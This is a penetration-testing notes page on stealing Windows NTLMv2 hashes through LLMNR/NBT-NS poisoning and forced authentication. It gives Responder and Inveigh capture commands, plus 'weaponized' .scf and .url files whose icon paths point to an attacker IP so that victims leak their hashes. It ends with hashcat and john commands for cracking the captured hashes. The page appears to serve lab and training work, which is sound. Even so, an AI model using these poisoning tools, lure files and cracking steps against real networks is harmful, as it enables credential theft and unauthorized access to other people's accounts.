---
description: Credential Access, Stealing hashes
---

# LLMNR Poisoning/Forced Authentication

## LLMNR Poisoning

Link-Local Multicast Name Resolution (LLMNR) is a protocol that is able to perform name resolution in the absence of a DNS server. When a request is made for a share such as `\\Fileshares` and the user accidently instead types `\\Filesharez` getting the share name incorrect DNS would first attempt to resolve the target share and when failing to do so (As it does not exist) It will fallback to LLMNR.

Once DNS has failed to resolve the request and LLMNR kicks in the requesting machine will send out a broadcast on the subnet asking if anyone of the other devices can connect them to the share `\\Filesharez` The attacking machine on the network will respond to the request stating that it can get them connected to the share. At this point the requesting (victim) machine will send the username and NTLMv2 hash of the account requesting the resource over to the malicious machine.

Responder will print it out on screen and write it to a log file per host located in the `/usr/share/responder/logs` directory. Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`, and one hash is printed to the console and stored in its associated log file unless `-v` mode is enabled

<figure><img src="../../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

Analysis Mode

```
sudo responder -I ens224 -A 
```

### via SSRF

{% embed url="https://lojique.gitbook.io/proving-grounds/v/heist/web-enum/website" %}

### Inveigh

LLMNR & NBT-NS poisoning is possible from a Windows host as well. The tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.&#x20;

#### Powershell

```powershell
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

#### C# ([InveighZero](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework\_4.7\_x86/Inveigh.exe))

```powershell-session
.\Inveigh.exe
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```

We can also see the message `Press ESC to enter/exit interactive console`, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.

We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.

\


## Forced Authentication

{% embed url="https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication" %}

### Execution via .SCF

Place the below `.scf` file on the attacker controlled machine in a shared folder

{% code title="pwn.scf" %}
```csharp
[Shell]
Command=2
IconFile=\\192.168.123.123\home\kali\pwn.scf
[Taskbar]
Command=ToggleDesktop
```
{% endcode %}

Create a listener on the attacking system:

{% code title="attacker@local" %}
```
responder -I eth1 -v
```
{% endcode %}

### Execution via .URL

Create a weaponized .url file and upload it to the victim system:

```csharp
[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\192.168.123.123\%USERNAME%.icon
IconIndex=1
```

Create a listener on the attacking system:

{% code title="attacker@local" %}
```
responder -I eth1 -v
```
{% endcode %}

## Example

{% embed url="https://lojique.gitbook.io/proving-grounds/v/vault/other-services-enumeration/445-smb" %}

## Cracking NTLMv2

```bash
# On Kali
hashcat -m 5600 'pasted hash' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmhash.txt
```

```bash
# On windows host
hashcat.exe -m 5600 hash.txt rockyou.txt -O
```

## Resources

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/llmnr" %}

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks" %}

{% embed url="https://attack.mitre.org/techniques/T1557/001/" %}
